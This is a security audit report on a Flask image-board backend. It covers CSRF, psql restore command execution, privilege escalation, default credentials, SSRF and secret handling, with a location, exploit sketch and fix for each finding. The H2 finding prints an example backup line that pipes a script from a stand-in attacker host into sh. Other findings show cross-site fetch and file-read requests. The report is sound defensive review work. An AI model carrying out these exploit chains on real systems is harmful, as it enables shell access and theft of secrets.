# Security audit: Python backend

Scope: `onani/routes/**`, `onani/controllers/**`, `onani/services/**`, `onani/importers/**`, `onani.toml.example`, `run.py`, plus the config and app bootstrap they depend on (`onani/config.py`, `onani/__init__.py`, `onani/models/user/_user.py`, `onani/models/schemas/user.py`).
This was a read-only review. Every finding below was checked against the code.

Severity counts: critical 0, high 7, medium 6, low 8.

---

## HIGH

### H1. The full v1 API is CSRF-exempt, and the remember-me cookie has no SameSite attribute
- **Where:** `onani/routes/api/v1/__init__.py:15` (`Api(api_v1, decorators=[csrf.exempt])`); `onani/routes/api/v1/auth.py:50,103` (`login_user(..., remember=True)`); `onani/config.py:109-113` sets only `SESSION_COOKIE_*`. No `REMEMBER_COOKIE_SAMESITE` or `REMEMBER_COOKIE_SECURE` is set, so Flask-Login's defaults apply: no SameSite attribute and `Secure=False`.
- **Problem:** The CSRF token endpoint (`/auth/csrf`) exists but nothing checks the token. The session cookie is `SameSite=Strict`. The `remember_token` cookie has no SameSite attribute, so Firefox and Safari send it on cross-site requests. Chrome also sends it for 2 minutes after it is set ("Lax+POST"). Flask-Login rebuilds the session from `remember_token`. Endpoints that read `form`/`files` accept `multipart/form-data`, which is a CORS "simple" request and needs no preflight.
- **Exploit:** A logged-in admin (Firefox) visits the attacker's page. The page runs `fetch("https://onani.example/api/v1/admin/database/restore", {method:"POST", mode:"no-cors", credentials:"include", body: formData})`, where `formData` has `confirm=RESTORE` and a malicious SQL file. The database is replaced, and combined with H2 this gives a shell. The same approach works for forced uploads on `/posts/upload`.
- **Fix:** Remove `csrf.exempt` and send `X-CSRFToken` from the SPA, or keep the exemption and require a custom header or JSON content type on every mutating verb. Set `REMEMBER_COOKIE_SAMESITE="Strict"`, `REMEMBER_COOKIE_SECURE=True` and `REMEMBER_COOKIE_HTTPONLY=True` in `config.py`.
- **Effort:** M

### H2. Database restore passes uploaded SQL to `psql`: admin gets OS command execution
- **Where:** `onani/services/maintenance.py:204-224` (sanitiser), `:226-240` (`subprocess.run(["psql", ...], input=restore_bytes)`); reached from `onani/routes/api/v1/_admin/stats.py:348-369` (ADMIN role).
- **Problem:** The sanitiser removes only some `SET` and `DROP` lines. `psql` runs backslash meta-commands from stdin, including `\! <shell cmd>`, `\copy ... to program`, and `\o |cmd`. The child process inherits `os.environ` (secret key, DB password) plus `PGPASSWORD`.
- **Exploit:** An ADMIN (or a CSRF'd admin, see H1, or an escalated account, see H3/H4) uploads a backup containing the line `\! curl attacker/x.sh | sh`. The shell runs as the app user inside the web container.
- **Fix:** Reject any line starting with `\` (after whitespace), and run `psql` with `--no-psqlrc` and a minimal environment. A stronger option is `pg_dump -Fc` with `pg_restore` (no meta-commands) and restricting restore to OWNER.
- **Effort:** S

### H3. A holder of `EDIT_USERS` can grant any permission bits, including ADMINISTRATION
- **Where:** `onani/routes/api/v1/_admin/user.py:95-100`
- **Problem:** The role changes are checked against the caller's own role (`:86-93`). The `permissions` integer is not checked at all: any valid `UserPermissions` value is accepted, including bits the caller does not have.
- **Exploit:** A moderator with `EDIT_USERS` sends `PUT /api/v1/admin/user {"user_id": <own sock-puppet MEMBER>, "permissions": <ADMINISTRATION>}`. The sock-puppet can then create external libraries (see M1, file read) and use every permission-gated endpoint.
- **Fix:** Unless the caller is OWNER, require `new_perms & ~current_user.permissions == 0` (only bits the caller already holds can be granted).
- **Effort:** S

### H4. ADMIN can create or promote OWNER accounts
- **Where:** `onani/routes/api/v1/_admin/stats.py:395-415` (POST, `role` choices include `"OWNER"`), `:420-438` (PUT)
- **Problem:** The only checks are "not self" and "target is not already OWNER". Unlike `admin/user` PUT, there is no "role must be below your own" rule. At every startup, `onani/__init__.py:121-125` gives all OWNERs `ADMINISTRATION` permissions.
- **Exploit:** An ADMIN sends `POST /api/v1/admin/users {"username":"x","password":"...","role":"OWNER"}`, logs in as `x`, and now has full owner rights, including the ability to demote or delete the real owner through `admin/user`.
- **Fix:** Unless the caller is OWNER, reject `UserRoles[role].value >= current_user.role.value` in both POST and PUT.
- **Effort:** S

### H5. The plaintext account password is stored in the client-side session cookie
- **Where:** `onani/routes/api/v1/auth.py:54`, `onani/routes/api/v1/profile.py:156` (`session["_cookie_pw"] = password`), read back at `onani/routes/api/v1/importer.py:32`
- **Problem:** The code comment says "server-side session", but Flask's default session is a signed, **unencrypted**, base64 cookie. No server-side session backend is configured.
- **Exploit:** Anyone who gets the session cookie (a shared computer, a browser-sync or backup leak, a proxy or log that captures cookies, or a malicious extension) can base64-decode it and read the user's real password. That works for credential stuffing elsewhere and survives a session revocation.
- **Fix:** Never store the password. Derive the cookie-decryption key once at login, keep it server-side (Redis, keyed by a random ID in the session), or encrypt it with a server key. Better still, drop per-user password-derived encryption for gallery-dl cookies.
- **Effort:** M

### H6. A default `admin`/`admin` owner account is created on first start
- **Where:** `onani/__init__.py:106-119` (`os.environ.get("DEFAULT_ADMIN_PASSWORD", "admin")`)
- **Problem:** A fresh deployment that does not set `DEFAULT_ADMIN_PASSWORD` has a known OWNER login. The code only logs a warning. The whole block is wrapped in `except Exception: pass`, so problems here are silent.
- **Exploit:** An attacker scans for new instances, logs in as `admin`/`admin`, and uses H2 to get a shell.
- **Fix:** Refuse to create the account without `DEFAULT_ADMIN_PASSWORD`, or generate a random password and print it once. Add a forced password change on first login.
- **Effort:** S

### H7. An admin-defined library path is served to anonymous users with no root allowlist
- **Where:** `onani/routes/api/v1/libraries.py:73-80,127-131` (any absolute path accepted); `onani/routes/spa.py:77-80` (`/external/<library>/<path>`, no auth)
- **Problem:** `_resolve_external_path` keeps requests inside the library root, but the root itself can be `/`. The route needs no login, so any file readable by the web user becomes public.
- **Exploit:** An ADMINISTRATION holder (reachable through H3) creates a library `{"name":"x","path":"/"}`. Then `GET /external/x/proc/self/environ` (or `/external/x/etc/onani/onani.toml`) returns the secret key and DB password to anyone.
- **Fix:** Require library paths to sit under a configured allowlist (for example `LIBRARY_ROOTS`, checked with `os.path.realpath`). Resolve symlinks with `realpath` in `_resolve_external_path` too.
- **Effort:** S

---

## MEDIUM

### M1. SSRF in URL import (no host or scheme validation)
- **Where:** `onani/routes/api/v1/importer.py:23-44` → `onani/services/imports.py:77-122` → `onani/importers/_utils.py:125-176` (`download_file`), `onani/importers/gallery_dl_importer.py:96-101`
- **Problem:** Any logged-in user can submit any URL. The only gate is `gallery_dl.extractor.find(url)`. gallery-dl's generic `directlink` extractor matches any `http(s)://host/…​.jpg|png|mp4…` URL, and the worker then fetches it with curl_cffi. Nothing blocks private, loopback, or link-local addresses. When a response starts with `{`, `[` or `<html`, the error at `_utils.py:170-172` puts its first 64 bytes into the task result, which the user can read through `GET /import?id=`.
- **Exploit:** A MEMBER sends `POST /api/v1/import {"url":"http://postgres:5432/x.png"}`, or targets internal admin panels or cloud metadata, from inside the Docker network. This probes internal ports and services and leaks JSON/HTML snippets.
- **Fix:** Before enqueueing, and again before each `download_file`, resolve the host and reject private, loopback, link-local and reserved IPs. Allow only `http`/`https`, and turn off redirects to such hosts. Do not echo response bytes in errors.
- **Effort:** M

### M2. Changing the password does not invalidate existing sessions or remember cookies
- **Where:** `onani/routes/api/v1/profile.py:81-86`, `onani/routes/api/v1/_admin/user.py:81-84`, `onani/models/user/_user.py:195-210`
- **Problem:** Flask-Login identifies users by `login_id` (`_user.py:270`), and `set_password` never rotates it.
- **Exploit:** An attacker who stole a session or a 7-day `remember_token` keeps access after the victim (or an admin) resets the password.
- **Fix:** In `set_password`, set `self.login_id = str(uuid.uuid4())` (and re-login the current user on self-change).
- **Effort:** S

### M3. Stored gallery-dl cookies are held in plaintext at rest
- **Where:** `onani/services/imports.py:102` (`queue_meta={"cookies_content": ...}` in the DB), `:119-121` (passed as a Celery arg into Redis); `onani/tasks/importer.py:87-89` (temp file)
- **Problem:** The encrypted cookie upload is decrypted in the request and then kept in plaintext in `import_jobs.queue_meta` and in the broker. Any DB backup (`/admin/database/backup`) or Redis access exposes users' third-party site sessions.
- **Exploit:** An ADMIN downloads a DB backup, or someone reaches Redis on the compose network, and reads session cookies for users' Pixiv, Twitter or Reddit accounts.
- **Fix:** Pass only the job ID and decrypt in the worker with a server-held key. Clear `queue_meta` after dispatch. Enable Celery message signing/encryption or keep Redis strictly internal.
- **Effort:** M

### M4. Unbounded cached-thumbnail generation by anonymous users (disk exhaustion)
- **Where:** `onani/services/files.py:27-45` (any integer 16–2048 accepted), `:56-88`; `onani/routes/spa.py:106-175`
- **Problem:** Each distinct `?size=` value creates a new file under `.thumbs/<variant>/<WxH>/`. There are 2033 sizes per image, for every post and avatar, with no authentication.
- **Exploit:** A loop over `/images/thumbnail/<shard>/<file>?size=16..2048` across all posts fills the images volume and costs CPU (LANCZOS resize for each size).
- **Fix:** Accept only the named presets (`xsmall`/`small`/`large`/`xlarge`), or snap sizes to a small fixed set.
- **Effort:** S

### M5. The CREATE_TAGS permission is bypassed through the importer
- **Where:** `onani/importers/_utils.py:246` (`can_create_tags = True`)
- **Problem:** Uploads check `UserPermissions.CREATE_TAGS` (`posts.py:278`). Imports always create tags, including arbitrary tag names from remote metadata.
- **Exploit:** A MEMBER without CREATE_TAGS hosts a page or feed whose metadata carries attacker-chosen tags, imports it, and floods the tag namespace.
- **Fix:** Pass `user.has_permissions(UserPermissions.CREATE_TAGS)` in place of the hardcoded `True`.
- **Effort:** S

### M6. Hidden posts (banned users, disabled libraries) are still served by id and on the home page
- **Where:** `onani/routes/api/v1/posts.py:149` (`/post?id=`), `:427-457` (`/posts/home` recent/popular/random), `onani/routes/api/v1/users.py:52` (`/users/posts`), `onani/routes/api/v1/collections.py:37`
- **Problem:** Only `/posts` filters on `Post.hidden`. The moderation "hide posts" action (`services/bans.py:50`) and library disable (`libraries.py:137-145`) therefore do not hide anything on these routes.
- **Exploit:** An anonymous user walks `/api/v1/post?id=1..N`, or opens a banned user's profile, and sees content moderators hid.
- **Fix:** Add `Post.hidden.is_(False)` to these queries, or return 404 for hidden posts unless the caller is a moderator.
- **Effort:** S

---

## LOW

### L1. The TOTP secret can be read again after 2FA is enabled
- **Where:** `onani/routes/api/v1/profile.py:172-186`
- **Problem / exploit:** `GET /profile/otp` always returns `secret` and the provisioning URI. An attacker with a hijacked session (or XSS) copies the second factor permanently.
- **Fix:** Return the secret only while `otp_enabled` is false. Rotate `otp_token` when 2FA is re-enabled.
- **Effort:** S

### L2. 2FA can be enabled without verifying a code
- **Where:** `onani/routes/api/v1/profile.py:88-92`
- **Problem / exploit:** `PUT /profile {"otp_enabled": true}` switches 2FA on without a code check. An attacker holding a session (or a CSRF on JSON, if one is ever possible) locks the user out, and recovery needs the CLI.
- **Fix:** Allow only disabling here; enabling must go through `POST /profile/otp` with a valid code.
- **Effort:** S

### L3. TOTP codes can be replayed
- **Where:** `onani/models/user/_user.py:222-227` (the TODO is acknowledged in code)
- **Problem / exploit:** The same code is valid for about 90 s (`valid_window=1`), so a phished or shoulder-surfed code works again.
- **Fix:** Store the last accepted time-step per user and reject any step at or before it.
- **Effort:** S

### L4. The example config ships a working placeholder secret key
- **Where:** `onani.toml.example:18`, `onani/config.py:61-67`
- **Problem / exploit:** Copying the example unchanged gives `SECRET_KEY="change-me-in-production"`, which is accepted. Anyone can then forge session cookies. Impersonation still needs a victim's `login_id`, but session and flash tampering and CSRF-token forgery become possible.
- **Fix:** Refuse to start when the key equals the placeholder or is shorter than 32 bytes.
- **Effort:** S

### L5. The CLI password reset uses a non-cryptographic RNG and a short password
- **Where:** `run.py:79`
- **Problem / exploit:** `random.choices` (Mersenne Twister) generates only 8 letters, so a reset password is weak and predictable in principle.
- **Fix:** `secrets.token_urlsafe(16)`.
- **Effort:** S

### L6. The admin errors endpoint returns full tracebacks with an unbounded page size
- **Where:** `onani/routes/api/v1/_admin/stats.py:112-127`
- **Problem / exploit:** MODERATOR (not ADMIN) sees full tracebacks, which can contain file paths and local values. `per_page` has no cap, so `?per_page=1000000` loads the whole table into one response.
- **Fix:** Cap `per_page` at `API_MAX_PER_PAGE` and raise the requirement to ADMIN.
- **Effort:** S

### L7. `_admin/users` GET has an unbounded page size
- **Where:** `onani/routes/api/v1/_admin/stats.py:387`
- **Problem / exploit:** `per_page` is not capped, so a moderator can pull every user record in one request, which is heavy on the DB.
- **Fix:** `min(per_page, API_MAX_PER_PAGE)`.
- **Effort:** S

### L8. Avatar upload returns the raw exception text
- **Where:** `onani/routes/api/v1/profile.py:108-109`
- **Problem / exploit:** `f"Avatar upload failed: {e}"` sends PIL and decoder internals (and paths, if an `OSError` occurs) back to the client.
- **Fix:** Return a generic message and log the exception.
- **Effort:** S

---

## Checked, nothing found
- **SQL injection:** every query goes through the SQLAlchemy ORM with bound parameters. The `ilike` searches (`tags.py:117`, `stats.py:384`) only allow wildcard matching, not injection. `Tags` sort uses a whitelist dict.
- **Upload path traversal:** stored filenames are `sha256.<PIL format>`. The `spa.py` file routes reject `/`, `\` and `..`.
- **Unsafe deserialization:** there is no pickle, yaml.load or eval. Celery uses JSON by default.
- **Error handler** (`onani/__init__.py:80-92`): 500s return only an error id.
- **Object-level authorization:** collections, posts edit/delete, and import job delete/list all check ownership or role.
- **Login rate limit:** 10/min per IP (`auth.py:28`).

## Summary
1. The worst risks are a chain: the CSRF-exempt API plus a SameSite-less remember cookie (H1) lets a malicious page drive an admin's browser, and the DB-restore `psql` endpoint (H2) turns that into a shell.
2. Privilege escalation is easy: `EDIT_USERS` can grant ADMINISTRATION (H3), ADMIN can create OWNER accounts (H4), and ADMINISTRATION can publish any file on disk anonymously (H7).
3. Secret handling is weak: the plaintext password sits in the signed-only session cookie (H5), the default `admin`/`admin` owner is created on first start (H6), and third-party cookies are stored in plaintext in the DB and Redis (M3).
4. Importer SSRF (M1), no session invalidation on password change (M2), hidden-post leakage (M6) and thumbnail disk DoS (M4) are the main medium issues.
5. No SQL injection, upload path traversal or unsafe deserialization was found. Most fixes are small (S), and fixing H1, H2 and H6 first breaks the path to remote code execution.
